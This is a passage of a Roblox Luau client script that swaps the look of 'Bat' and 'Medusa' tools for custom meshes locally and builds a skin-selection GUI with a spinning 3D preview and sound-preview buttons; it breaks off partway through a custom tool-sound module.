        for obj,val in pairs(entry.original or {}) do
            if obj and obj.Parent then pcall(function() obj.Transparency = val end) end
        end
        local handle = entry.tool and entry.tool:FindFirstChild("Handle")
        if handle then
            local rep = handle:FindFirstChild("SoundSkinReplica")
            if rep then pcall(function() rep:Destroy() end) end
        end
    end

    local function teardownSkinTool(tool)
        local entry = SK.tracked[tool]
        if not entry then return end
        for _,c in ipairs(entry.conns) do pcall(function() c:Disconnect() end) end
        restoreTool(entry)
        SK.tracked[tool] = nil
    end

    local function setupSkinTool(tool)
        if not SK.enabled or SK.tracked[tool] then return end
        local cat = toolCategory(tool)
        if not cat then return end
        local handle = tool:FindFirstChild("Handle")
        if not handle then
            if SK.pending[tool] then return end
            local c
            c = tool.ChildAdded:Connect(function(child)
                if child.Name == "Handle" then
                    pcall(function() c:Disconnect() end)
                    SK.pending[tool] = nil
                    if SK.enabled then pcall(function() setupSkinTool(tool) end) end
                end
            end)
            SK.pending[tool] = c
            return
        end
        local entry = {tool=tool,cat=cat,original={},conns={},replica=nil}
        SK.tracked[tool] = entry
        for _,obj in ipairs(tool:GetDescendants()) do hideOriginal(entry,obj) end
        entry.replica = buildReplica(handle,selectedSkin(cat))
        entry.conns[#entry.conns+1] = tool.DescendantAdded:Connect(function(obj)
            task.defer(function()
                if SK.tracked[tool] then
                    if obj.Name == "SoundSkinReplica" then return end
                    hideOriginal(entry,obj)
                end
            end)
        end)
        entry.conns[#entry.conns+1] = tool.AncestryChanged:Connect(function(_,parent)
            if not parent then teardownSkinTool(tool) end
        end)
    end

    local function watchSkinContainer(container)
        if not container or SK.watchers[container] then return end
        SK.watchers[container] = {container.ChildAdded:Connect(setupSkinTool)}
        for _,child in ipairs(container:GetChildren()) do setupSkinTool(child) end
    end

    local function unwatchSkinContainer(container)
        local cons = SK.watchers[container]
        if not cons then return end
        for _,c in ipairs(cons) do pcall(function() c:Disconnect() end) end
        SK.watchers[container]=nil
    end

    local function watchSkinAll()
        watchSkinContainer(LP:FindFirstChildOfClass("Backpack"))
        watchSkinContainer(LP.Character)
        task.defer(function()
            for _, delayTime in ipairs({0.05, 0.35, 1.0, 2.0}) do
                task.wait(delayTime)
                if not SK.enabled then break end
                watchSkinContainer(LP:FindFirstChildOfClass("Backpack"))
                watchSkinContainer(LP.Character)
            end
        end)
    end

    local function rebuildAllSkins()
        for tool,entry in pairs(SK.tracked) do
            if tool and tool.Parent then
                restoreTool(entry)
                for _,obj in ipairs(tool:GetDescendants()) do hideOriginal(entry,obj) end
                local handle = tool:FindFirstChild("Handle")
                if handle then
                    pcall(function()
                        entry.replica = buildReplica(handle,selectedSkin(entry.cat))
                        for _,obj in ipairs(tool:GetDescendants()) do hideOriginal(entry,obj) end
                    end)
                end
            else
                SK.tracked[tool]=nil
            end
        end
    end

    local function skSet(cat,key)
        local data = SK.assets[key]
        if not data or data.cat ~= cat then return end
        if cat == "Bat" then S.customToolSkinBat = key else S.customToolSkinMedusa = key end
        rebuildAllSkins()
        pcall(F.saveFeatureConfigAndMain)
    end

    local function skNext(cat)
        local options = {}
        for key,data in pairs(SK.assets) do if data.cat == cat then options[#options+1]=key end end
        table.sort(options)
        local cur = (cat=="Bat") and S.customToolSkinBat or S.customToolSkinMedusa
        local idx=1
        for i,key in ipairs(options) do if key==cur then idx=i break end end
        idx=(idx%#options)+1
        skSet(cat,options[idx])
    end

    local function skinIntegrityPass(deep)
        if not SK.enabled then return end
        pcall(watchSkinAll)
        local bp = LP:FindFirstChildOfClass("Backpack")
        if bp then
            for _,child in ipairs(bp:GetChildren()) do pcall(setupSkinTool,child) end
        end
        local char = LP.Character
        if char then
            for _,child in ipairs(char:GetChildren()) do pcall(setupSkinTool,child) end
        end
        for tool,entry in pairs(SK.tracked) do
            if not tool or not tool.Parent then
                teardownSkinTool(tool)
            else
                local handle = tool:FindFirstChild("Handle")
                if handle then
                    local rep = handle:FindFirstChild("SoundSkinReplica")
                    local part = rep and rep:FindFirstChild("MainPart")
                    local motor = part and part:FindFirstChild("SoundSkinMotor")
                    local broken = (not rep) or (not part) or (not motor) or motor.Part0 ~= handle or motor.Part1 ~= part
                    if broken then
                        pcall(function() restoreTool(entry) end)
                        entry.replica = buildReplica(handle,selectedSkin(entry.cat))
                    end
                    if deep or broken then
                        for _,obj in ipairs(tool:GetDescendants()) do
                            pcall(hideOriginal,entry,obj)
                        end
                    end
                else
                    -- Tool handles can be inserted late by the game.
                    pcall(function() setupSkinTool(tool) end)
                end
            end
        end
    end

    local function skSetEnabled(on)
        SK.enabled = on and true or false
        S.customToolsEnabled = SK.enabled
        if SK.enabled then
            pcall(watchSkinAll)
            task.defer(function() pcall(skinIntegrityPass,true) end)
            for tool in pairs(SK.tracked) do if not tool.Parent then SK.tracked[tool]=nil end end
        else
            for tool in pairs(SK.tracked) do teardownSkinTool(tool) end
            for _,c in pairs(SK.pending) do pcall(function() c:Disconnect() end) end
            table.clear(SK.pending)
            for container in pairs(SK.watchers) do unwatchSkinContainer(container) end
        end
        -- Persist the real live module state, not only the UI state.
        pcall(function() if F and F.saveFeatureConfigAndMain then F.saveFeatureConfigAndMain() elseif F and F.saveConfig then F.saveConfig(true) end end)
    end

    task.spawn(function()
        local tickCount = 0
        while true do
            task.wait(0.35)
            if SK.enabled then
                tickCount += 1
                pcall(skinIntegrityPass, (tickCount % 4) == 0)
            end
        end
    end)

    LP.CharacterAdded:Connect(function()
        task.defer(function()
            for tool in pairs(SK.tracked) do teardownSkinTool(tool) end
            for _,c in pairs(SK.pending) do pcall(function() c:Disconnect() end) end
            table.clear(SK.pending)
            for container in pairs(SK.watchers) do unwatchSkinContainer(container) end
            if SK.enabled then
                watchSkinAll()
            end
        end)
    end)

    -- Keep references available for reset / load logic.
    _G.SoundSetCustomToolSkin = skSet
    _G.SoundSetCustomToolEnabled = skSetEnabled

    -- ================================================================
    -- SKIN TOOL UI: one OPEN button only
    -- ================================================================

    local _vxPreviewSound = nil
    local _vxPreviewToken = 0

    local function cleanupSkinPreviewSound(sound)
        if not sound then return end
        pcall(function() sound:Stop() end)
        pcall(function() sound:Destroy() end)
        if _vxPreviewSound == sound then
            _vxPreviewSound = nil
        end
    end

    local function skinPreviewSound(cat)
        local previewIds = {
            Bat    = {id = "rbxassetid://5713085119", skip = 0.2},
            Medusa = {id = "rbxassetid://3102797479", skip = 0.0},
        }
        local data = previewIds[cat]
        if not data then return false end

        _vxPreviewToken += 1
        local myToken = _vxPreviewToken

        -- Satu preview aktif saja. Klik berikutnya menghentikan preview lama.
        if _vxPreviewSound then
            cleanupSkinPreviewSound(_vxPreviewSound)
        end

        local ok, result = pcall(function()
            local SoundService = game:GetService("SoundService")
            local ContentProvider = game:GetService("ContentProvider")

            local snd = Instance.new("Sound")
            snd.Name = "SoundSkinToolPreview"
            snd.SoundId = data.id
            snd.Volume = 1
            snd.Looped = false
            snd.PlayOnRemove = false
            snd.Parent = SoundService
            _vxPreviewSound = snd

            -- Tunggu asset siap, tetapi jangan pernah memanggil Play lebih dari sekali.
            pcall(function()
                ContentProvider:PreloadAsync({snd})
            end)

            local loadDeadline = os.clock() + 4
            while snd.Parent and not snd.IsLoaded and os.clock() < loadDeadline do
                if myToken ~= _vxPreviewToken then return false end
                task.wait(0.05)
            end

            if myToken ~= _vxPreviewToken or not snd.Parent or not snd.IsLoaded then
                cleanupSkinPreviewSound(snd)
                return false
            end

            if data.skip and data.skip > 0 then
                pcall(function() snd.TimePosition = data.skip end)
            end

            local endedConn
            endedConn = snd.Ended:Connect(function()
                if endedConn then
                    pcall(function() endedConn:Disconnect() end)
                    endedConn = nil
                end
                cleanupSkinPreviewSound(snd)
            end)

            -- PERSIS SATU KALI PLAY. Tidak ada fallback kedua/ketiga dan tidak ada loop.
            snd:Play()

            -- Safety cleanup bila asset/client tidak pernah mengirim Ended.
            task.spawn(function()
                local deadline = os.clock() + 12
                while snd.Parent and myToken == _vxPreviewToken and os.clock() < deadline do
                    if not snd.IsPlaying and snd.TimePosition > 0 then break end
                    task.wait(0.1)
                end
                if endedConn then
                    pcall(function() endedConn:Disconnect() end)
                    endedConn = nil
                end
                if myToken == _vxPreviewToken then
                    cleanupSkinPreviewSound(snd)
                end
            end)

            return true
        end)

        if not ok then
            if _vxPreviewSound then cleanupSkinPreviewSound(_vxPreviewSound) end
            return false
        end
        return result == true
    end

    local skinGui=nil
    local function destroySkinGui()
        _G._SoundSkinApplyAccent = nil
        if skinGui then pcall(function() skinGui:Destroy() end) end
        if _G._SoundSkinPreviewSpin then pcall(function() _G._SoundSkinPreviewSpin:Disconnect() end); _G._SoundSkinPreviewSpin=nil end
        skinGui=nil
    end

    local function openSkinGui()
        if skinGui and skinGui.Parent then destroySkinGui(); return end
        skSetEnabled(true)
        S.customToolsEnabled = true
        pcall(F.saveFeatureConfigAndMain)

        local sg=Instance.new("ScreenGui")
        sg.Name="SoundSkinToolGUI"
        sg.ResetOnSpawn=false
        sg.IgnoreGuiInset=true
        sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
        sg.DisplayOrder=10051
        sg.Parent=safeParentGui()
        skinGui=sg

        local bg=Instance.new("Frame",sg)
        bg.Size=UDim2.fromScale(1,1); bg.BackgroundColor3=Color3.new(0,0,0); bg.BackgroundTransparency=0.46; bg.BorderSizePixel=0; bg.ZIndex=1
        local box=Instance.new("Frame",sg)
        box.Size=UDim2.new(0,390,0,430); box.Position=UDim2.new(0.5,-195,0.5,-215); box.BackgroundColor3=Color3.fromRGB(8,8,10); box.BorderSizePixel=0; box.ZIndex=2; corner(box,15); stroke(box,Color3.fromRGB(90,90,95),1,0.3)
        local ttl=Instance.new("TextLabel",box); ttl.Size=UDim2.new(1,-60,0,34); ttl.Position=UDim2.new(0,14,0,7); ttl.BackgroundTransparency=1; ttl.Text="SKIN TOOL"; ttl.TextColor3=Color3.new(1,1,1); ttl.Font=Enum.Font.GothamBlack; ttl.TextSize=14; ttl.TextXAlignment=Enum.TextXAlignment.Left; ttl.ZIndex=4
        local close=Instance.new("TextButton",box); close.Size=UDim2.new(0,30,0,30); close.Position=UDim2.new(1,-38,0,8); close.BackgroundColor3=Color3.fromRGB(24,24,27); close.BorderSizePixel=0; close.Text="X"; close.TextColor3=Color3.new(1,1,1); close.Font=Enum.Font.GothamBold; close.TextSize=12; close.AutoButtonColor=false; close.ZIndex=5; corner(close,8); close.Activated:Connect(destroySkinGui)
        local sub=Instance.new("TextLabel",box); sub.Size=UDim2.new(1,-28,0,20); sub.Position=UDim2.new(0,14,0,39); sub.BackgroundTransparency=1; sub.Text="Select a Bat or Medusa skin"; sub.TextColor3=Color3.fromRGB(150,150,155); sub.Font=Enum.Font.GothamSemibold; sub.TextSize=9; sub.TextXAlignment=Enum.TextXAlignment.Left; sub.ZIndex=4

        local tabs=Instance.new("Frame",box); tabs.Size=UDim2.new(1,-28,0,34); tabs.Position=UDim2.new(0,14,0,66); tabs.BackgroundColor3=Color3.fromRGB(18,18,20); tabs.BorderSizePixel=0; tabs.ZIndex=4; corner(tabs,9); stroke(tabs,Color3.fromRGB(65,65,70),1,0.55)
        local batTab=Instance.new("TextButton",tabs); batTab.Size=UDim2.new(0.5,-2,1,-4); batTab.Position=UDim2.new(0,2,0,2); batTab.BackgroundColor3=Color3.fromRGB(238,238,238); batTab.BorderSizePixel=0; batTab.Text="BAT"; batTab.TextColor3=Color3.fromRGB(0,0,0); batTab.Font=Enum.Font.GothamBlack; batTab.TextSize=10; batTab.ZIndex=5; corner(batTab,7)
        local medTab=Instance.new("TextButton",tabs); medTab.Size=UDim2.new(0.5,-2,1,-4); medTab.Position=UDim2.new(0.5,0,0,2); medTab.BackgroundColor3=Color3.fromRGB(25,25,28); medTab.BorderSizePixel=0; medTab.Text="MEDUSA"; medTab.TextColor3=Color3.fromRGB(225,225,225); medTab.Font=Enum.Font.GothamBlack; medTab.TextSize=10; medTab.ZIndex=5; corner(medTab,7)

        -- Preview 3D della skin selezionata
        local previewHolder=Instance.new("Frame",box); previewHolder.Size=UDim2.new(0,168,0,170); previewHolder.Position=UDim2.new(0,14,0,108); previewHolder.BackgroundColor3=Color3.fromRGB(12,12,15); previewHolder.BorderSizePixel=0; previewHolder.ZIndex=4; corner(previewHolder,12); stroke(previewHolder,Color3.fromRGB(65,65,70),1,0.55)
        local previewTitle=Instance.new("TextLabel",previewHolder); previewTitle.Size=UDim2.new(1,-16,0,18); previewTitle.Position=UDim2.new(0,8,0,5); previewTitle.BackgroundTransparency=1; previewTitle.Text="3D PREVIEW"; previewTitle.TextColor3=COLORS.textDim; previewTitle.Font=Enum.Font.GothamBlack; previewTitle.TextSize=8; previewTitle.TextXAlignment=Enum.TextXAlignment.Left; previewTitle.ZIndex=6
        local preview=Instance.new("ViewportFrame",previewHolder); preview.Size=UDim2.new(1,-12,1,-30); preview.Position=UDim2.new(0,6,0,24); preview.BackgroundColor3=Color3.fromRGB(7,7,9); preview.BackgroundTransparency=0.15; preview.BorderSizePixel=0; preview.ZIndex=5; preview.Ambient=Color3.fromRGB(200,200,210); preview.LightColor=Color3.fromRGB(255,255,255); preview.LightDirection=Vector3.new(-0.35,-1,-0.55); corner(preview,10)
        local previewWorld=Instance.new("WorldModel"); previewWorld.Parent=preview
        local previewPart=Instance.new("Part"); previewPart.Name="SkinPreviewPart"; previewPart.Size=Vector3.new(1,1,1); previewPart.Anchored=true; previewPart.CanCollide=false; previewPart.CanTouch=false; previewPart.CanQuery=false; previewPart.Transparency=0; previewPart.Parent=previewWorld
        local previewMesh=Instance.new("SpecialMesh"); previewMesh.MeshType=Enum.MeshType.FileMesh; previewMesh.Parent=previewPart
        local previewCam=Instance.new("Camera"); previewCam.FieldOfView=38; previewCam.Parent=preview
        preview.CurrentCamera=previewCam

        local list=Instance.new("Frame",box); list.Size=UDim2.new(0,186,0,170); list.Position=UDim2.new(0,190,0,108); list.BackgroundTransparency=1; list.ZIndex=4
        local info=Instance.new("TextLabel",list); info.Size=UDim2.new(1,0,0,20); info.BackgroundTransparency=1; info.Text=""; info.TextColor3=COLORS.textDim; info.Font=Enum.Font.GothamSemibold; info.TextSize=9; info.TextXAlignment=Enum.TextXAlignment.Left; info.ZIndex=5
        local choose1=Instance.new("TextButton",list); choose1.Size=UDim2.new(1,0,0,38); choose1.Position=UDim2.new(0,0,0,25); choose1.BackgroundColor3=Color3.fromRGB(20,20,23); choose1.BorderSizePixel=0; choose1.TextColor3=COLORS.white; choose1.Font=Enum.Font.GothamSemibold; choose1.TextSize=10; choose1.AutoButtonColor=false; choose1.ZIndex=5; corner(choose1,8); stroke(choose1,Color3.fromRGB(70,70,75),1,0.6)
        local choose2=Instance.new("TextButton",list); choose2.Size=UDim2.new(1,0,0,38); choose2.Position=UDim2.new(0,0,0,70); choose2.BackgroundColor3=Color3.fromRGB(20,20,23); choose2.BorderSizePixel=0; choose2.TextColor3=COLORS.white; choose2.Font=Enum.Font.GothamSemibold; choose2.TextSize=10; choose2.AutoButtonColor=false; choose2.ZIndex=5; corner(choose2,8); stroke(choose2,Color3.fromRGB(70,70,75),1,0.6)
        local state=Instance.new("TextLabel",list); state.Size=UDim2.new(1,0,0,36); state.Position=UDim2.new(0,0,0,118); state.BackgroundTransparency=1; state.TextColor3=Color3.fromRGB(150,150,155); state.Font=Enum.Font.GothamSemibold; state.TextSize=9; state.TextWrapped=true; state.TextXAlignment=Enum.TextXAlignment.Left; state.ZIndex=5

        local soundTitle=Instance.new("TextLabel",box); soundTitle.Size=UDim2.new(1,-28,0,18); soundTitle.Position=UDim2.new(0,14,0,292); soundTitle.BackgroundTransparency=1; soundTitle.Text="SOUND PREVIEW"; soundTitle.TextColor3=COLORS.textDim; soundTitle.Font=Enum.Font.GothamBlack; soundTitle.TextSize=9; soundTitle.TextXAlignment=Enum.TextXAlignment.Left; soundTitle.ZIndex=5
        local batSound=Instance.new("TextButton",box); batSound.Size=UDim2.new(0.5,-20,0,34); batSound.Position=UDim2.new(0,14,0,316); batSound.BackgroundColor3=Color3.fromRGB(20,20,23); batSound.BorderSizePixel=0; batSound.Text="> BAT SOUND"; batSound.TextColor3=COLORS.white; batSound.Font=Enum.Font.GothamBold; batSound.TextSize=9; batSound.AutoButtonColor=false; batSound.ZIndex=5; corner(batSound,8); stroke(batSound,Color3.fromRGB(70,70,75),1,0.6)
        local medSound=Instance.new("TextButton",box); medSound.Size=UDim2.new(0.5,-20,0,34); medSound.Position=UDim2.new(0.5,6,0,316); medSound.BackgroundColor3=Color3.fromRGB(20,20,23); medSound.BorderSizePixel=0; medSound.Text="> MEDUSA SOUND"; medSound.TextColor3=COLORS.white; medSound.Font=Enum.Font.GothamBold; medSound.TextSize=9; medSound.AutoButtonColor=false; medSound.ZIndex=5; corner(medSound,8); stroke(medSound,Color3.fromRGB(70,70,75),1,0.6)

        -- ============================================================
        -- SKIN TOOL UI POLISH V4 (VISUAL ONLY)
        -- Clean monochrome design. Layout / callbacks / logic unchanged.
        -- ============================================================
        local accent = S.themeColor or COLORS.accent or Color3.fromRGB(255,255,255)

        local function accentSoft(c, amount)
            amount = tonumber(amount) or 0.10
            return Color3.new(c.R * (1-amount) + amount, c.G * (1-amount) + amount, c.B * (1-amount) + amount)
        end

        local function killStroke(obj)
            if not obj then return end
            for _, ch in ipairs(obj:GetChildren()) do
                if ch:IsA("UIStroke") then
                    ch.Transparency = 1
                end
            end
        end

        local function textStyle(obj, size, color, font)
            if not obj then return end
            obj.Visible = true
            obj.TextTransparency = 0
            obj.TextScaled = false
            obj.TextSize = size
            obj.TextColor3 = color
            obj.Font = font or Enum.Font.GothamSemibold
            obj.TextStrokeColor3 = Color3.fromRGB(0,0,0)
            obj.TextStrokeTransparency = 0.82
            obj.ZIndex = 20
        end

        local function buttonStyle(btn, bg, hover, radius)
            if not btn then return end
            btn.AutoButtonColor = false
            btn.BackgroundColor3 = bg
            btn.BackgroundTransparency = 0
            btn.TextTransparency = 0
            btn.TextScaled = false
            btn.TextYAlignment = Enum.TextYAlignment.Center
            btn.TextStrokeColor3 = Color3.fromRGB(0,0,0)
            btn.TextStrokeTransparency = 0.84
            btn.ZIndex = 20
            killStroke(btn)
            local c = btn:FindFirstChildOfClass("UICorner")
            if not c and radius then
                corner(btn, radius)
            end
            btn.MouseEnter:Connect(function()
                if btn.Parent then btn.BackgroundColor3 = hover end
            end)
            btn.MouseLeave:Connect(function()
                if btn.Parent then btn.BackgroundColor3 = bg end
            end)
        end

        local function gradient(obj, a, b, rotation)
            local g = obj and obj:FindFirstChild("SoundCleanGradient")
            if not obj then return end
            if not g then
                g = Instance.new("UIGradient")
                g.Name = "SoundCleanGradient"
                g.Parent = obj
            end
            g.Color = ColorSequence.new(a,b)
            g.Rotation = rotation or 90
            return g
        end

        -- Remove previously accumulated decorative layers that caused the
        -- unwanted lines and the "3D LOCAL" text near the close button.
        for _,name in ipairs({
            "SoundSkinHeaderLine","SoundSkinBadge","SoundSkinBottomGlow",
            "SoundPreviewBottomGlow","SoundPreviewGlow","SoundPreviewMark",
            "SoundStateLine"
        }) do
            local obj = box:FindFirstChild(name) or previewHolder:FindFirstChild(name) or list:FindFirstChild(name)
            if obj then pcall(function() obj:Destroy() end) end
        end
        if close:FindFirstChild("SoundSkinBadge") then pcall(function() close.SoundSkinBadge:Destroy() end) end

        -- Main modal: clean black glass.
        bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
        bg.BackgroundTransparency = 0.48
        box.BackgroundColor3 = Color3.fromRGB(9,9,11)
        box.BackgroundTransparency = 0
        killStroke(box)
        gradient(box, Color3.fromRGB(18,18,22), Color3.fromRGB(7,7,9), 105)

        -- Soft shadow only; no extra lines around the modal.
        local shadow = sg:FindFirstChild("SoundSkinShadow")
        if shadow then
            shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
            shadow.BackgroundTransparency = 0.42
            shadow.ZIndex = 1
        end
        box.ZIndex = 4

        textStyle(ttl, 16, Color3.fromRGB(250,250,252), Enum.Font.GothamBlack)
        ttl.Position = UDim2.new(0,16,0,8)

        local headerAccent = Instance.new("Frame", box)
        headerAccent.Name = "SoundSkinHeaderAccent"
        headerAccent.Size = UDim2.new(1,-32,0,2)
        headerAccent.Position = UDim2.new(0,16,0,58)
        headerAccent.BackgroundColor3 = accent
        headerAccent.BackgroundTransparency = 0.08
        headerAccent.BorderSizePixel = 0
        headerAccent.ZIndex = 21
        corner(headerAccent, 2)
        local headerGlow = Instance.new("UIStroke", headerAccent)
        headerGlow.Name = "SoundSkinHeaderGlow"
        headerGlow.Color = accent
        headerGlow.Thickness = 3.5
        headerGlow.Transparency = 0.78
        local accentGlow = Instance.new("UIStroke", box)
        accentGlow.Name = "SoundSkinOuterGlow"
        accentGlow.Color = accent
        accentGlow.Thickness = 5
        accentGlow.Transparency = 0.91
        textStyle(sub, 9, Color3.fromRGB(155,155,164), Enum.Font.GothamMedium)
        sub.Position = UDim2.new(0,16,0,40)
        sub.Text = "Choose a skin and preview it instantly"
        textStyle(close, 14, Color3.fromRGB(245,245,248), Enum.Font.GothamBlack)
        close.Text = "X"
        close.BackgroundColor3 = Color3.fromRGB(24,24,28)
        close.BackgroundTransparency = 0
        killStroke(close)

        -- Tabs: monochrome segmented control.
        tabs.BackgroundColor3 = Color3.fromRGB(15,15,18)
        tabs.BackgroundTransparency = 0
        killStroke(tabs)
        gradient(tabs, Color3.fromRGB(21,21,25), Color3.fromRGB(11,11,14), 90)
        buttonStyle(batTab, accent, accentSoft(accent, 0.10), 7)
        buttonStyle(medTab, Color3.fromRGB(25,25,29), Color3.fromRGB(38,38,44), 7)
        textStyle(batTab, 10, Color3.fromRGB(255,255,255), Enum.Font.GothamBlack)
        textStyle(medTab, 10, Color3.fromRGB(236,236,240), Enum.Font.GothamBlack)
        local batTabAccentStroke = Instance.new("UIStroke", batTab)
        batTabAccentStroke.Name = "SoundSkinAccentStroke"
        batTabAccentStroke.Color = accent
        batTabAccentStroke.Thickness = 1.3
        batTabAccentStroke.Transparency = 0.18
        local medTabAccentStroke = Instance.new("UIStroke", medTab)
        medTabAccentStroke.Name = "SoundSkinAccentStroke"
        medTabAccentStroke.Color = accent
        medTabAccentStroke.Thickness = 1.1
        medTabAccentStroke.Transparency = 0.62

        -- Preview: remove border lines, keep depth through contrast.
        previewHolder.BackgroundColor3 = Color3.fromRGB(11,11,14)
        killStroke(previewHolder)
        local previewAccentStroke = Instance.new("UIStroke", previewHolder)
        previewAccentStroke.Name = "SoundSkinAccentStroke"
        previewAccentStroke.Color = accent
        previewAccentStroke.Thickness = 1.15
        previewAccentStroke.Transparency = 0.58
        gradient(previewHolder, Color3.fromRGB(20,20,25), Color3.fromRGB(8,8,11), 105)
        textStyle(previewTitle, 8, Color3.fromRGB(170,170,181), Enum.Font.GothamBlack)
        preview.BackgroundColor3 = Color3.fromRGB(4,4,7)
        preview.BackgroundTransparency = 0.02
        killStroke(preview)

        -- Selection cards: clean, readable, no extra separator lines.
        textStyle(info, 9, Color3.fromRGB(185,185,194), Enum.Font.GothamBlack)
        for _,b in ipairs({choose1,choose2}) do
            buttonStyle(b, Color3.fromRGB(19,19,23), Color3.fromRGB(32,32,38), 9)
            killStroke(b)
            local choiceAccentStroke = Instance.new("UIStroke", b)
            choiceAccentStroke.Name = "SoundSkinAccentStroke"
            choiceAccentStroke.Color = accent
            choiceAccentStroke.Thickness = 1.05
            choiceAccentStroke.Transparency = 0.72
            b.TextXAlignment = Enum.TextXAlignment.Left
            b.TextYAlignment = Enum.TextYAlignment.Center
            textStyle(b, 10, Color3.fromRGB(244,244,247), Enum.Font.GothamSemibold)
            -- Remove old decorative bars/sheens that looked like stray lines.
            for _,n in ipairs({"SoundChoiceAccent","SoundChoiceSheen"}) do
                local old=b:FindFirstChild(n)
                if old then pcall(function() old:Destroy() end) end
            end
        end
        textStyle(state, 9, Color3.fromRGB(205,205,214), Enum.Font.GothamMedium)
        state.TextWrapped = true
        state.TextXAlignment = Enum.TextXAlignment.Left
        state.TextYAlignment = Enum.TextYAlignment.Center

        -- Sound preview: compact monochrome buttons.
        textStyle(soundTitle, 9, Color3.fromRGB(183,183,194), Enum.Font.GothamBlack)
        for _,b in ipairs({batSound,medSound}) do
            buttonStyle(b, Color3.fromRGB(19,19,23), Color3.fromRGB(34,34,40), 9)
            killStroke(b)
            local soundAccentStroke = Instance.new("UIStroke", b)
            soundAccentStroke.Name = "SoundSkinAccentStroke"
            soundAccentStroke.Color = accent
            soundAccentStroke.Thickness = 1.0
            soundAccentStroke.Transparency = 0.76
            textStyle(b, 9, Color3.fromRGB(242,242,246), Enum.Font.GothamBold)
            -- Remove extra markers from prior polish versions.
            for _,n in ipairs({"SoundBatDot","SoundMedusaDot","SoundPlayMark"}) do
                local old=b:FindFirstChild(n)
                if old then pcall(function() old:Destroy() end) end
            end
        end

        -- Strong text visibility pass; no overlays on top of labels.
        for _,obj in ipairs({ttl,sub,close,batTab,medTab,previewTitle,info,choose1,choose2,state,soundTitle,batSound,medSound}) do
            if obj then
                obj.Visible = true
                obj.TextTransparency = 0
                obj.ZIndex = 20
            end
        end

        local function applySkinAccent(col)
            accent = col or accent
            pcall(function()
                headerAccent.BackgroundColor3 = accent
                headerGlow.Color = accent
                accentGlow.Color = accent
                previewAccentStroke.Color = accent
                for _,obj in ipairs({batTab, medTab, choose1, choose2, batSound, medSound}) do
                    if obj then
                        for _,st in ipairs(obj:GetChildren()) do
                            if st:IsA("UIStroke") and st.Name == "SoundSkinAccentStroke" then
                                st.Color = accent
                            end
                        end
                    end
                end
            end)
        end
        _G._SoundSkinApplyAccent = applySkinAccent
        applySkinAccent(accent)

        local activeCat="Bat"
        local function refreshPreview(key)
            local def=SK.assets[key]
            if not def then return end
            previewMesh.MeshId=def.mesh
            previewMesh.TextureId=def.tex
            previewMesh.Scale=def.scale
            previewPart.CFrame=CFrame.new(0,0,0)
            local distance=tonumber(def.view) or 5
            previewCam.CFrame=CFrame.new(0,0,distance)
        end
        local previewSpinConn=nil
        local function startPreviewSpin()
            if previewSpinConn then pcall(function() previewSpinConn:Disconnect() end) end
            previewSpinConn=RunService.RenderStepped:Connect(function()
                if not (preview and preview.Parent and previewPart and previewPart.Parent) then return end
                local angle=(os.clock()*0.7)%((math.pi)*2)
                previewPart.CFrame=CFrame.Angles(0,angle,0)
            end)
            _G._SoundSkinPreviewSpin=previewSpinConn
        end
        local function refresh()
            local cat=activeCat
            local options={}
            for key,data in pairs(SK.assets) do if data.cat==cat then options[#options+1]={key=key,label=data.label} end end
            table.sort(options,function(a,b) return a.label<b.label end)
            info.Text=(cat=="Bat") and "BAT SKINS" or "MEDUSA SKINS"
            local cur=(cat=="Bat") and S.customToolSkinBat or S.customToolSkinMedusa
            choose1.Text=options[1] and ((cur==options[1].key and "> " or "")..options[1].label) or "None"
            choose2.Text=options[2] and ((cur==options[2].key and "> " or "")..options[2].label) or "None"
            state.Text="Selected: "..tostring(SK.assets[cur] and SK.assets[cur].label or "None")
            info.TextTransparency = 0
            choose1.TextTransparency = 0
            choose2.TextTransparency = 0
            state.TextTransparency = 0
            refreshPreview(cur)
            local on=cat=="Bat"
            batTab.BackgroundColor3=on and accent or Color3.fromRGB(25,25,28)
            batTab.TextColor3=on and Color3.fromRGB(0,0,0) or Color3.fromRGB(225,225,225)
            medTab.BackgroundColor3=on and Color3.fromRGB(25,25,28) or accent
            medTab.TextColor3=on and Color3.fromRGB(225,225,225) or Color3.fromRGB(0,0,0)
            applySkinAccent(accent)
        end
        local function selectOption(i)
            local cat=activeCat; local options={}
            for key,data in pairs(SK.assets) do if data.cat==cat then options[#options+1]={key=key,label=data.label} end end
            table.sort(options,function(a,b) return a.label<b.label end)
            if options[i] then skSet(cat,options[i].key); refresh() end
        end
        batTab.Activated:Connect(function() activeCat="Bat"; refresh() end)
        medTab.Activated:Connect(function() activeCat="Medusa"; refresh() end)
        choose1.Activated:Connect(function() selectOption(1) end)
        choose2.Activated:Connect(function() selectOption(2) end)
        batSound.Activated:Connect(function() skinPreviewSound("Bat") end)
        medSound.Activated:Connect(function() skinPreviewSound("Medusa") end)
        bg.InputBegan:Connect(function(input) if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then destroySkinGui() end end)
        refresh()
        for _,obj in ipairs({box,tabs,previewHolder,preview,choose1,choose2,batSound,medSound,close}) do
            if obj then
                for _,ch in ipairs(obj:GetChildren()) do
                    if ch:IsA("UIStroke") then ch.Transparency = 1 end
                end
            end
        end
        startPreviewSpin()
        skSetEnabled(true)
        pcall(function() for _,c in ipairs(SK.watchers) do end end)
        pcall(function() rebuildAllSkins() end)
        pcall(function() if _G.AmbitiousCustomToolsRecheck then _G.AmbitiousCustomToolsRecheck() end end)
    end


    local CSND = {
        sounds = {
            Bat={id="rbxassetid://5713085119",skip=0.2},
            Medusa={id="rbxassetid://3102797479",doublePlay=true,delay=0.5},
        },
        enabled=false,
        tracked=setmetatable({}, {__mode="k"}),
        watchers=setmetatable({}, {__mode="k"}),
        pending=setmetatable({}, {__mode="k"}),
    }

    local function csToolCategory(tool) return toolCategory(tool) end

    local function csPlay(entry)
        local snd=entry and entry.custom
        local d=entry and entry.data
        if not snd or not snd.Parent or not d or not CSND.enabled then return end
        local now = tick()
        if entry.lastPlay and (now - entry.lastPlay) < 0.09 then return end
        entry.lastPlay = now
        if entry.timer then pcall(task.cancel,entry.timer); entry.timer=nil end
        task.spawn(function()
            if not CSND.enabled or not snd or not snd.Parent then return end
            pcall(function()
                if not snd.IsLoaded then
                    game:GetService("ContentProvider"):PreloadAsync({snd})
                end
            end)
            if not CSND.enabled or not snd.Parent then return end
            pcall(function()
                snd:Stop()
                snd.TimePosition=d.skip or 0
                snd.Volume=1
                snd:Play()
            end)
        end)
